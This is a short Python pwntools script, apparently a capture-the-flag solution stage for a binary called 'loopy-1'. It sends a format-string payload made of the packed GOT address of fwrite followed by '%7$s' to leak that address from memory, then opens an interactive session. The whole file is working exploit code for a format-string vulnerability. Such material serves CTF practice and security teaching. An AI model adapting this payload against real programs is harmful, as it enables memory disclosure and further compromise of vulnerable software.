#!/usr/bin/env python

from pwn import *

p = process('./loopy-1')
e = ELF('./loopy-1')
fwrite_got = e.got['fwrite']


payload = ''
payload+= p32(fwrite_got)
payload+= '%7$s'
p.sendline(payload)
p.interactive()